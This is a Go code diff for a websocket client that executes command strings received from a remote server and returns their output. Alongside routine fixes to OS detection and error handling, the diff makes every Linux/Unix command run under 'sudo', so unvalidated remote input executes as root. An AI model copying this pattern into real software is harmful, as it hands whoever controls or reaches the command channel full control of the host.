@@ -4,8 +4,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 
 	"github.com/gorilla/websocket"
@@ -80,10 +80,11 @@ func (c *Client) handleCommand(command string) {
 	log.Printf("Executing command: %s", command)
 
 	var cmd *exec.Cmd
-	if os.Getenv("HORIZON_OS") == "windows" || len(os.Args) > 0 {
+	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd.exe", "/c", command)
 	} else {
-		cmd = exec.Command("/bin/sh", "-c", command)
+		// Execute with sudo for elevated privileges on Linux/Unix
+		cmd = exec.Command("/bin/sh", "-c", "sudo "+command)
 	}
 
 	output, err := cmd.CombinedOutput()
@@ -91,7 +92,11 @@ func (c *Client) handleCommand(command string) {
 	errMsg := ""
 
 	if err != nil {
-		exitCode = 1
+		if exitErr, ok := err.(*exec.ExitError); ok {
+			exitCode = exitErr.ExitCode()
+		} else {
+			exitCode = 1
+		}
 		errMsg = err.Error()
 	}
 
@@ -103,7 +108,9 @@ func (c *Client) handleCommand(command string) {
 	}
 
 	data, _ := json.Marshal(result)
-	c.conn.WriteMessage(websocket.TextMessage, data)
+	if err := c.conn.WriteMessage(websocket.TextMessage, data); err != nil {
+		log.Printf("Failed to send command result: %v", err)
+	}
 }
 
 func (c *Client) Close() error {
